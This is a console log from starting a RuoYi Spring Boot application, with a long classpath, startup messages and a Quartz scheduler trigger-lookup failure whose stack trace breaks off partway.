D:\configure\jdk1.8.0_181\jre\lib\charsets.jar;D:\configure\jdk1.8.0_181\jre\lib\deploy.jar;D:\configure\jdk1.8.0_181\jre\lib\ext\access-bridge-64.jar;D:\configure\jdk1.8.0_181\jre\lib\ext\cldrdata.jar;D:\configure\jdk1.8.0_181\jre\lib\ext\dnsns.jar;D:\configure\jdk1.8.0_181\jre\lib\ext\jaccess.jar;D:\configure\jdk1.8.0_181\jre\lib\ext\jfxrt.jar;D:\configure\jdk1.8.0_181\jre\lib\ext\localedata.jar;D:\configure\jdk1.8.0_181\jre\lib\ext\nashorn.jar;D:\configure\jdk1.8.0_181\jre\lib\ext\sunec.jar;D:\configure\jdk1.8.0_181\jre\lib\ext\sunjce_provider.jar;D:\configure\jdk1.8.0_181\jre\lib\ext\sunmscapi.jar;D:\configure\jdk1.8.0_181\jre\lib\ext\sunpkcs11.jar;D:\configure\jdk1.8.0_181\jre\lib\ext\zipfs.jar;D:\configure\jdk1.8.0_181\jre\lib\javaws.jar;D:\configure\jdk1.8.0_181\jre\lib\jce.jar;D:\configure\jdk1.8.0_181\jre\lib\jfr.jar;D:\configure\jdk1.8.0_181\jre\lib\jfxswt.jar;D:\configure\jdk1.8.0_181\jre\lib\jsse.jar;D:\configure\jdk1.8.0_181\jre\lib\management-agent.jar;D:\configure\jdk1.8.0_181\jre\lib\plugin.jar;D:\configure\jdk1.8.0_181\jre\lib\resources.jar;D:\configure\jdk1.8.0_181\jre\lib\rt.jar;E:\moudleSet\ruoyi\ruoyi-admin\target\classes;D:\configure\apache-maven-3.6.1\conf\repository\org\springframework\boot\spring-boot-starter-thymeleaf\2.1.1.RELEASE\spring-boot-starter-thymeleaf-2.1.1.RELEASE.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\springframework\boot\spring-boot-starter\2.1.1.RELEASE\spring-boot-starter-2.1.1.RELEASE.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\springframework\boot\spring-boot-starter-logging\2.1.1.RELEASE\spring-boot-starter-logging-2.1.1.RELEASE.jar;D:\configure\apache-maven-3.6.1\conf\repository\ch\qos\logback\logback-classic\1.2.3\logback-classic-1.2.3.jar;D:\configure\apache-maven-3.6.1\conf\repository\ch\qos\logback\logback-core\1.2.3\logback-core-1.2.3.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\apache\logging\log4j\log4j-to-slf4j\2.11.1\log4j-to-slf4j-2.11.1.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\apache\logging\log4j\log4j-api\2.11.1\log4j-api-2.11.1.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\slf4j\jul-to-slf4j\1.7.25\jul-to-slf4j-1.7.25.jar;D:\configure\apache-maven-3.6.1\conf\repository\javax\annotation\javax.annotation-api\1.3.2\javax.annotation-api-1.3.2.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\springframework\spring-core\5.1.3.RELEASE\spring-core-5.1.3.RELEASE.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\springframework\spring-jcl\5.1.3.RELEASE\spring-jcl-5.1.3.RELEASE.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\yaml\snakeyaml\1.23\snakeyaml-1.23.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\thymeleaf\thymeleaf-spring5\3.0.11.RELEASE\thymeleaf-spring5-3.0.11.RELEASE.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\thymeleaf\thymeleaf\3.0.11.RELEASE\thymeleaf-3.0.11.RELEASE.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\attoparser\attoparser\2.0.5.RELEASE\attoparser-2.0.5.RELEASE.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\unbescape\unbescape\1.1.6.RELEASE\unbescape-1.1.6.RELEASE.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\thymeleaf\extras\thymeleaf-extras-java8time\3.0.2.RELEASE\thymeleaf-extras-java8time-3.0.2.RELEASE.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\springframework\boot\spring-boot-devtools\2.1.1.RELEASE\spring-boot-devtools-2.1.1.RELEASE.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\springframework\boot\spring-boot\2.1.1.RELEASE\spring-boot-2.1.1.RELEASE.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\springframework\spring-context\5.1.3.RELEASE\spring-context-5.1.3.RELEASE.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\springframework\spring-expression\5.1.3.RELEASE\spring-expression-5.1.3.RELEASE.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\springframework\boot\spring-boot-autoconfigure\2.1.1.RELEASE\spring-boot-autoconfigure-2.1.1.RELEASE.jar;D:\configure\apache-maven-3.6.1\conf\repository\io\springfox\springfox-swagger2\2.9.2\springfox-swagger2-2.9.2.jar;D:\configure\apache-maven-3.6.1\conf\repository\io\springfox\springfox-spi\2.9.2\springfox-spi-2.9.2.jar;D:\configure\apache-maven-3.6.1\conf\repository\io\springfox\springfox-core\2.9.2\springfox-core-2.9.2.jar;D:\configure\apache-maven-3.6.1\conf\repository\net\bytebuddy\byte-buddy\1.9.5\byte-buddy-1.9.5.jar;D:\configure\apache-maven-3.6.1\conf\repository\io\springfox\springfox-schema\2.9.2\springfox-schema-2.9.2.jar;D:\configure\apache-maven-3.6.1\conf\repository\io\springfox\springfox-swagger-common\2.9.2\springfox-swagger-common-2.9.2.jar;D:\configure\apache-maven-3.6.1\conf\repository\io\springfox\springfox-spring-web\2.9.2\springfox-spring-web-2.9.2.jar;D:\configure\apache-maven-3.6.1\conf\repository\com\google\guava\guava\20.0\guava-20.0.jar;D:\configure\apache-maven-3.6.1\conf\repository\com\fasterxml\classmate\1.4.0\classmate-1.4.0.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\slf4j\slf4j-api\1.7.25\slf4j-api-1.7.25.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\springframework\plugin\spring-plugin-core\1.2.0.RELEASE\spring-plugin-core-1.2.0.RELEASE.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\springframework\spring-beans\5.1.3.RELEASE\spring-beans-5.1.3.RELEASE.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\springframework\spring-aop\5.1.3.RELEASE\spring-aop-5.1.3.RELEASE.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\springframework\plugin\spring-plugin-metadata\1.2.0.RELEASE\spring-plugin-metadata-1.2.0.RELEASE.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\mapstruct\mapstruct\1.2.0.Final\mapstruct-1.2.0.Final.jar;D:\configure\apache-maven-3.6.1\conf\repository\io\swagger\swagger-annotations\1.5.21\swagger-annotations-1.5.21.jar;D:\configure\apache-maven-3.6.1\conf\repository\io\swagger\swagger-models\1.5.21\swagger-models-1.5.21.jar;D:\configure\apache-maven-3.6.1\conf\repository\com\fasterxml\jackson\core\jackson-annotations\2.9.0\jackson-annotations-2.9.0.jar;D:\configure\apache-maven-3.6.1\conf\repository\io\springfox\springfox-swagger-ui\2.9.2\springfox-swagger-ui-2.9.2.jar;E:\moudleSet\ruoyi\ruoyi-framework\target\classes;D:\configure\apache-maven-3.6.1\conf\repository\org\springframework\boot\spring-boot-starter-web\2.1.1.RELEASE\spring-boot-starter-web-2.1.1.RELEASE.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\springframework\boot\spring-boot-starter-json\2.1.1.RELEASE\spring-boot-starter-json-2.1.1.RELEASE.jar;D:\configure\apache-maven-3.6.1\conf\repository\com\fasterxml\jackson\datatype\jackson-datatype-jdk8\2.9.7\jackson-datatype-jdk8-2.9.7.jar;D:\configure\apache-maven-3.6.1\conf\repository\com\fasterxml\jackson\datatype\jackson-datatype-jsr310\2.9.7\jackson-datatype-jsr310-2.9.7.jar;D:\configure\apache-maven-3.6.1\conf\repository\com\fasterxml\jackson\module\jackson-module-parameter-names\2.9.7\jackson-module-parameter-names-2.9.7.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\springframework\boot\spring-boot-starter-tomcat\2.1.1.RELEASE\spring-boot-starter-tomcat-2.1.1.RELEASE.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\apache\tomcat\embed\tomcat-embed-core\9.0.13\tomcat-embed-core-9.0.13.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\apache\tomcat\embed\tomcat-embed-el\9.0.13\tomcat-embed-el-9.0.13.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\apache\tomcat\embed\tomcat-embed-websocket\9.0.13\tomcat-embed-websocket-9.0.13.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\hibernate\validator\hibernate-validator\6.0.13.Final\hibernate-validator-6.0.13.Final.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\jboss\logging\jboss-logging\3.3.2.Final\jboss-logging-3.3.2.Final.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\springframework\spring-web\5.1.3.RELEASE\spring-web-5.1.3.RELEASE.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\springframework\spring-webmvc\5.1.3.RELEASE\spring-webmvc-5.1.3.RELEASE.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\springframework\boot\spring-boot-starter-aop\2.1.1.RELEASE\spring-boot-starter-aop-2.1.1.RELEASE.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\aspectj\aspectjweaver\1.9.2\aspectjweaver-1.9.2.jar;D:\configure\apache-maven-3.6.1\conf\repository\com\alibaba\druid-spring-boot-starter\1.1.14\druid-spring-boot-starter-1.1.14.jar;D:\configure\apache-maven-3.6.1\conf\repository\com\alibaba\druid\1.1.14\druid-1.1.14.jar;D:\configure\apache-maven-3.6.1\conf\repository\com\github\penggle\kaptcha\2.3.2\kaptcha-2.3.2.jar;D:\configure\apache-maven-3.6.1\conf\repository\com\jhlabs\filters\2.0.235-1\filters-2.0.235-1.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\apache\shiro\shiro-spring\1.4.1\shiro-spring-1.4.1.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\apache\shiro\shiro-core\1.4.1\shiro-core-1.4.1.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\apache\shiro\shiro-lang\1.4.1\shiro-lang-1.4.1.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\apache\shiro\shiro-crypto-hash\1.4.1\shiro-crypto-hash-1.4.1.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\apache\shiro\shiro-crypto-core\1.4.1\shiro-crypto-core-1.4.1.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\apache\shiro\shiro-crypto-cipher\1.4.1\shiro-crypto-cipher-1.4.1.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\apache\shiro\shiro-config-core\1.4.1\shiro-config-core-1.4.1.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\apache\shiro\shiro-config-ogdl\1.4.1\shiro-config-ogdl-1.4.1.jar;D:\configure\apache-maven-3.6.1\conf\repository\commons-beanutils\commons-beanutils\1.9.3\commons-beanutils-1.9.3.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\apache\shiro\shiro-event\1.4.1\shiro-event-1.4.1.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\apache\shiro\shiro-web\1.4.1\shiro-web-1.4.1.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\apache\shiro\shiro-ehcache\1.4.1\shiro-ehcache-1.4.1.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\apache\shiro\shiro-cache\1.4.1\shiro-cache-1.4.1.jar;D:\configure\apache-maven-3.6.1\conf\repository\net\sf\ehcache\ehcache-core\2.6.11\ehcache-core-2.6.11.jar;D:\configure\apache-maven-3.6.1\conf\repository\com\github\theborakompanioni\thymeleaf-extras-shiro\2.0.0\thymeleaf-extras-shiro-2.0.0.jar;D:\configure\apache-maven-3.6.1\conf\repository\eu\bitwalker\UserAgentUtils\1.19\UserAgentUtils-1.19.jar;E:\moudleSet\ruoyi\ruoyi-system\target\classes;D:\configure\apache-maven-3.6.1\conf\repository\mysql\mysql-connector-java\8.0.13\mysql-connector-java-8.0.13.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\apache\commons\commons-email\1.4\commons-email-1.4.jar;D:\configure\apache-maven-3.6.1\conf\repository\com\sun\mail\javax.mail\1.6.2\javax.mail-1.6.2.jar;D:\configure\apache-maven-3.6.1\conf\repository\javax\activation\activation\1.1.1\activation-1.1.1.jar;D:\configure\apache-maven-3.6.1\conf\repository\com\hynnet\jacob\1.18\jacob-1.18.jar;D:\configure\apache-maven-3.6.1\conf\repository\dom4j\dom4j\1.6.1\dom4j-1.6.1.jar;D:\configure\apache-maven-3.6.1\conf\repository\xml-apis\xml-apis\1.4.01\xml-apis-1.4.01.jar;D:\configure\apache-maven-3.6.1\conf\repository\com\github\oshi\oshi-core\3.9.1\oshi-core-3.9.1.jar;D:\configure\apache-maven-3.6.1\conf\repository\net\java\dev\jna\jna\4.5.2\jna-4.5.2.jar;D:\configure\apache-maven-3.6.1\conf\repository\net\java\dev\jna\jna-platform\4.5.2\jna-platform-4.5.2.jar;E:\moudleSet\ruoyi\ruoyi-quartz\target\classes;D:\configure\apache-maven-3.6.1\conf\repository\org\quartz-scheduler\quartz\2.3.0\quartz-2.3.0.jar;D:\configure\apache-maven-3.6.1\conf\repository\com\mchange\mchange-commons-java\0.2.11\mchange-commons-java-0.2.11.jar;E:\moudleSet\ruoyi\ruoyi-common\target\classes;D:\configure\apache-maven-3.6.1\conf\repository\org\springframework\spring-context-support\5.1.3.RELEASE\spring-context-support-5.1.3.RELEASE.jar;D:\configure\apache-maven-3.6.1\conf\repository\com\github\pagehelper\pagehelper-spring-boot-starter\1.2.5\pagehelper-spring-boot-starter-1.2.5.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\mybatis\spring\boot\mybatis-spring-boot-starter\1.3.2\mybatis-spring-boot-starter-1.3.2.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\springframework\boot\spring-boot-starter-jdbc\2.1.1.RELEASE\spring-boot-starter-jdbc-2.1.1.RELEASE.jar;D:\configure\apache-maven-3.6.1\conf\repository\com\zaxxer\HikariCP\3.2.0\HikariCP-3.2.0.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\springframework\spring-jdbc\5.1.3.RELEASE\spring-jdbc-5.1.3.RELEASE.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\springframework\spring-tx\5.1.3.RELEASE\spring-tx-5.1.3.RELEASE.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\mybatis\spring\boot\mybatis-spring-boot-autoconfigure\1.3.2\mybatis-spring-boot-autoconfigure-1.3.2.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\mybatis\mybatis\3.4.6\mybatis-3.4.6.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\mybatis\mybatis-spring\1.3.2\mybatis-spring-1.3.2.jar;D:\configure\apache-maven-3.6.1\conf\repository\com\github\pagehelper\pagehelper-spring-boot-autoconfigure\1.2.5\pagehelper-spring-boot-autoconfigure-1.2.5.jar;D:\configure\apache-maven-3.6.1\conf\repository\com\github\pagehelper\pagehelper\5.1.4\pagehelper-5.1.4.jar;D:\configure\apache-maven-3.6.1\conf\repository\com\github\jsqlparser\jsqlparser\1.0\jsqlparser-1.0.jar;D:\configure\apache-maven-3.6.1\conf\repository\javax\validation\validation-api\2.0.1.Final\validation-api-2.0.1.Final.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\apache\commons\commons-lang3\3.8.1\commons-lang3-3.8.1.jar;D:\configure\apache-maven-3.6.1\conf\repository\com\fasterxml\jackson\core\jackson-databind\2.9.7\jackson-databind-2.9.7.jar;D:\configure\apache-maven-3.6.1\conf\repository\com\fasterxml\jackson\core\jackson-core\2.9.7\jackson-core-2.9.7.jar;D:\configure\apache-maven-3.6.1\conf\repository\com\alibaba\fastjson\1.2.60\fastjson-1.2.60.jar;D:\configure\apache-maven-3.6.1\conf\repository\commons-io\commons-io\2.5\commons-io-2.5.jar;D:\configure\apache-maven-3.6.1\conf\repository\commons-fileupload\commons-fileupload\1.3.3\commons-fileupload-1.3.3.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\apache\poi\poi-ooxml\3.17\poi-ooxml-3.17.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\apache\poi\poi\3.17\poi-3.17.jar;D:\configure\apache-maven-3.6.1\conf\repository\commons-codec\commons-codec\1.11\commons-codec-1.11.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\apache\commons\commons-collections4\4.1\commons-collections4-4.1.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\apache\poi\poi-ooxml-schemas\3.17\poi-ooxml-schemas-3.17.jar;D:\configure\apache-maven-3.6.1\conf\repository\org\apache\xmlbeans\xmlbeans\2.6.0\xmlbeans-2.6.0.jar;D:\configure\apache-maven-3.6.1\conf\repository\stax\stax-api\1.0.1\stax-api-1.0.1.jar;D:\configure\apache-maven-3.6.1\conf\repository\com\github\virtuald\curvesapi\1.04\curvesapi-1.04.jar;D:\configure\apache-maven-3.6.1\conf\repository\javax\servlet\javax.servlet-api\4.0.1\javax.servlet-api-4.0.1.jar;E:\moudleSet\ruoyi\ruoyi-generator\target\classes;D:\configure\apache-maven-3.6.1\conf\repository\org\apache\velocity\velocity\1.7\velocity-1.7.jar;D:\configure\apache-maven-3.6.1\conf\repository\commons-collections\commons-collections\3.2.1\commons-collections-3.2.1.jar;D:\configure\apache-maven-3.6.1\conf\repository\commons-lang\commons-lang\2.4\commons-lang-2.4.jar com.ruoyi.RuoYiApplication Application Version: 4.0.0 Spring Boot Version: 2.1.1.RELEASE //////////////////////////////////////////////////////////////////// // <em>ooOoo</em> // // o8888888o // // 88"" . ""88 // // (| ^_^ |) // // O\ = /O // // <em><em>/. // // / \||| : |||// \ // // / <em>||||| -:- |||||- \ // // | | \\ - /// | | // // | _| ''---/'' | | // // \ .-_</em> <em>/-. / // // <em>. . ___ // // ."""" '&lt; - `.;;. : | | // // \ \ / / // // ========-.</em>_</em></em>/</em>.-=---=' // // ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ // // 佛祖保佑 永不宕机 永无BUG // //////////////////////////////////////////////////////////////////// 10:09:08.910 [restartedMain] INFO c.r.RuoYiApplication - [logStarting,50] - Starting RuoYiApplication on DESKTOP-E0A053F with PID 14700 (E:\moudleSet\ruoyi\ruoyi-admin\target\classes started by 47920 in E:\moudleSet\ruoyi) 10:09:08.914 [restartedMain] DEBUG c.r.RuoYiApplication - [logStarting,53] - Running with Spring Boot v2.1.1.RELEASE, Spring v5.1.3.RELEASE 10:09:08.915 [restartedMain] INFO c.r.RuoYiApplication - [logStartupProfileInfo,679] - The following profiles are active: druid 10:09:10.443 [restartedMain] WARN n.s.e.DiskStorePathManager - [resolveAndLockIfNeeded,162] - diskStorePath 'C:\Users\47920\AppData\Local\Temp' is already used by an existing CacheManager either in the same VM or in a different process. The diskStore path for this CacheManager will be set to C:\Users\47920\AppData\Local\Temp\ehcache_auto_created5112613266399061462diskstore. To avoid this warning consider using the CacheManager factory methods to create a singleton CacheManager or specifying a separate ehcache configuration (ehcache.xml) for each CacheManager instance. 10:09:10.443 [restartedMain] WARN n.s.e.s.d.DiskStorageFactory - [,132] - Data in persistent disk stores is ignored for stores from automatically created directories. Remove diskPersistent or resolve the conflicting disk paths in cache configuration. Deleting data file C:\Users\47920\AppData\Local\Temp\ehcache_auto_created5112613266399061462diskstore\shiro-active%0053ession%0043ache.data 10:09:10.454 [restartedMain] INFO o.a.s.c.e.EhCacheManager - [getCache,158] - Cache with name 'com.ruoyi.framework.shiro.realm.UserRealm.authorizationCache' does not yet exist. Creating now. 10:09:10.455 [restartedMain] INFO o.a.s.c.e.EhCacheManager - [getCache,165] - Added EhCache named [com.ruoyi.framework.shiro.realm.UserRealm.authorizationCache] 10:09:11.048 [restartedMain] INFO o.a.s.c.e.EhCacheManager - [getCache,169] - Using existing EHCache named [loginRecordCache] 10:09:11.379 [restartedMain] INFO o.a.s.c.e.EhCacheManager - [getCache,169] - Using existing EHCache named [sys-userCache] 10:09:11.379 [restartedMain] INFO o.a.s.c.e.EhCacheManager - [getCache,169] - Using existing EHCache named [sys-userCache] 10:09:11.706 [restartedMain] INFO o.a.c.h.Http11NioProtocol - [log,173] - Initializing ProtocolHandler [""http-nio-1017""] 10:09:11.712 [restartedMain] INFO o.a.c.c.StandardService - [log,173] - Starting service [Tomcat] 10:09:11.712 [restartedMain] INFO o.a.c.c.StandardEngine - [log,173] - Starting Servlet Engine: Apache Tomcat/9.0.13 10:09:11.717 [restartedMain] INFO o.a.c.c.AprLifecycleListener - [log,173] - The APR based Apache Tomcat Native library which allows optimal performance in production environments was not found on the java.library.path: [D:\configure\jdk1.8.0_181\bin;C:\Windows\Sun\Java\bin;C:\Windows\system32;C:\Windows;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0;C:\Windows\System32\OpenSSH;C:\Program Files\Intel\WiFi\bin;C:\Program Files\Common Files\Intel\WirelessCommon;C:\Program Files (x86)\NVIDIA Corporation\PhysX\Common;C:\Program Files\NVIDIA Corporation\NVIDIA NvDLISR;D:\configure\jdk1.8.0_181\bin;D:\configure\apache-maven-3.5.2\bin;D:\configure\apache-tomcat-8.5.37\bin;D:\TortoiseSVN\bin;D:\GIT\Git\cmd;C:\Users\47920\AppData\Local\Microsoft\WindowsApps;;.] 10:09:11.790 [restartedMain] INFO o.a.c.c.C.[.[.[/MoudleSet] - [log,173] - Initializing Spring embedded WebApplicationContext 10:09:12.518 [restartedMain] INFO c.a.d.p.DruidDataSource - [init,991] - {dataSource-1} inited 10:09:12.550 [restartedMain] INFO o.q.i.StdSchedulerFactory - [instantiate,1208] - Using default implementation for ThreadExecutor 10:09:12.559 [restartedMain] INFO o.q.c.SchedulerSignalerImpl - [,61] - Initialized Scheduler Signaller of type: class org.quartz.core.SchedulerSignalerImpl 10:09:12.559 [restartedMain] INFO o.q.c.QuartzScheduler - [,229] - Quartz Scheduler v.2.3.0 created. 10:09:12.563 [restartedMain] INFO o.q.c.QuartzScheduler - [initialize,294] - Scheduler meta-data: Quartz Scheduler (v2.3.0) 'RuoyiScheduler' with instanceId 'DESKTOP-E0A053F1571710152551' Scheduler class: 'org.quartz.core.QuartzScheduler' - running locally. NOT STARTED. Currently in standby mode. Number of jobs executed: 0 Using thread pool 'org.quartz.simpl.SimpleThreadPool' - with 20 threads. Using job-store 'org.springframework.scheduling.quartz.LocalDataSourceJobStore' - which supports persistence. and is clustered. 10:09:12.563 [restartedMain] INFO o.q.i.StdSchedulerFactory - [instantiate,1362] - Quartz scheduler 'RuoyiScheduler' initialized from an externally provided properties instance. 10:09:12.564 [restartedMain] INFO o.q.i.StdSchedulerFactory - [instantiate,1366] - Quartz scheduler version: 2.3.0 10:09:12.565 [restartedMain] INFO o.q.c.QuartzScheduler - [setJobFactory,2287] - JobFactory set to: org.springframework.scheduling.quartz.AdaptableJobFactory@9417079 10:09:12.595 [restartedMain] DEBUG c.r.q.m.S.selectJobAll - [debug,159] - ==&gt; Preparing: select job_id, job_name, job_group, invoke_target, cron_expression, misfire_policy, concurrent, status, create_by, create_time, remark from sys_job 10:09:12.652 [restartedMain] DEBUG c.r.q.m.S.selectJobAll - [debug,159] - ==&gt; Parameters: 10:09:12.678 [restartedMain] DEBUG c.r.q.m.S.selectJobAll - [debug,159] - &lt;== Total: 3 10:09:13.761 [restartedMain] WARN o.s.b.w.s.c.AnnotationConfigServletWebServerApplicationContext - [refresh,554] - Exception encountered during context initialization - cancelling refresh attempt: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'sysJobController': Unsatisfied dependency expressed through field 'jobService'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'sysJobServiceImpl': Invocation of init method failed; nested exception is org.quartz.JobPersistenceException: Couldn't obtain triggers for job: No record found for selection of Trigger with key: 'DEFAULT.TASK_CLASS_NAME3' and statement: SELECT * FROM QRTZ_CRON_TRIGGERS WHERE SCHED_NAME = 'RuoyiScheduler' AND TRIGGER_NAME = ? AND TRIGGER_GROUP = ? [See nested exception: java.lang.IllegalStateException: No record found for selection of Trigger with key: 'DEFAULT.TASK_CLASS_NAME3' and statement: SELECT * FROM QRTZ_CRON_TRIGGERS WHERE SCHED_NAME = 'RuoyiScheduler' AND TRIGGER_NAME = ? AND TRIGGER_GROUP = ?] 10:09:13.761 [restartedMain] INFO o.q.c.QuartzScheduler - [shutdown,666] - Scheduler RuoyiScheduler_$<em>DESKTOP-E0A053F1571710152551 shutting down. 10:09:13.762 [restartedMain] INFO o.q.c.QuartzScheduler - [standby,585] - Scheduler RuoyiScheduler</em>$<em>DESKTOP-E0A053F1571710152551 paused. 10:09:13.762 [restartedMain] INFO o.q.c.QuartzScheduler - [shutdown,740] - Scheduler RuoyiScheduler</em>$_DESKTOP-E0A053F1571710152551 shutdown complete. 10:09:13.762 [restartedMain] INFO sys-user - [shutdownAsyncManager,56] - ====关闭后台任务任务线程池==== 10:09:13.766 [restartedMain] INFO c.a.d.p.DruidDataSource - [close,1928] - {dataSource-1} closed 10:09:13.769 [restartedMain] INFO o.a.c.c.StandardService - [log,173] - Stopping service [Tomcat] 10:09:13.799 [restartedMain] ERROR o.s.b.SpringApplication - [reportFailure,858] - Application run failed org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'sysJobController': Unsatisfied dependency expressed through field 'jobService'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'sysJobServiceImpl': Invocation of init method failed; nested exception is org.quartz.JobPersistenceException: Couldn't obtain triggers for job: No record found for selection of Trigger with key: 'DEFAULT.TASK_CLASS_NAME3' and statement: SELECT * FROM QRTZ_CRON_TRIGGERS WHERE SCHED_NAME = 'RuoyiScheduler' AND TRIGGER_NAME = ? AND TRIGGER_GROUP = ? [See nested exception: java.lang.IllegalStateException: No record found for selection of Trigger with key: 'DEFAULT.TASK_CLASS_NAME3' and statement: SELECT * FROM QRTZ_CRON_TRIGGERS WHERE SCHED_NAME = 'RuoyiScheduler' AND TRIGGER_NAME = ? AND TRIGGER_GROUP = ?] at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:596) at org.springframework.beans.factory.annotation.InjectionMetadata.inject(InjectionMetadata.java:90) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor.postProcessProperties(AutowiredAnnotationBeanPostProcessor.java:374) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1378) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:575) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:498) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:320) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:318) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:199) at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:846) at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:863) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:546) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:142) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:775) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:397) at org.springframework.boot.SpringApplication.run(SpringApplication.java:316) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1260) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1248) at com.ruoyi.RuoYiApplication.main(RuoYiApplication.java:23) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.boot.devtools.restart.RestartLauncher.run(RestartLauncher.java:49) Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'sysJobServiceImpl': Invocation of init method failed; nested exception is org.quartz.JobPersistenceException: Couldn't obtain triggers for job: No record found for selection of Trigger with key: 'DEFAULT.TASK_CLASS_NAME3' and statement: SELECT * FROM QRTZ_CRON_TRIGGERS WHERE SCHED_NAME = 'RuoyiScheduler' AND TRIGGER_NAME = ? AND TRIGGER_GROUP = ? [See nested exception: java.lang.IllegalStateException: No record found for selection of Trigger with key: 'DEFAULT.TASK_CLASS_NAME3' and statement: SELECT * FROM QRTZ_CRON_TRIGGERS WHERE SCHED_NAME = 'RuoyiScheduler' AND TRIGGER_NAME = ? AND TRIGGER_GROUP = ?] at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor.postProcessBeforeInitialization(InitDestroyAnnotationBeanPostProcessor.java:139) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyBeanPostProcessorsBeforeInitialization(AbstractAutowireCapableBeanFactory.java:419) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1737) at 